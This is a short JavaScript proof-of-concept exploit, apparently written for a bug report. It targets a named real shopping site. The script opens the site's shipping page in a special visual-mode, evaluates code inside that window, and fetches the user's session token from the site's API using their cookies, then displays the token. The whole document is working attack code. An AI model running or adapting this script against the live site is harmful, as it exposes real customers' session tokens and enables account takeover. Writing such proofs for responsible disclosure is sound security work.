var victimWindow = open('https://eur.halara.com/pages/shipping-customs?sa-visual-mode=true', 'victim-tab');

setTimeout(() => {
    victimWindow.eval(`
        fetch('https://api-proxy.eur.halara.com/mall-rest/api/v1/device/startup', {
            method: 'GET',
            credentials: 'include',
            headers: {
                'app-id': '29'
            }
        })
        .then(r => r.json())
        .then(data => {
            alert('Token: ' + data.data.token);
        })
        .catch(e => {
            alert('Error: ' + e.toString());
        });
    `);
}, 2000);
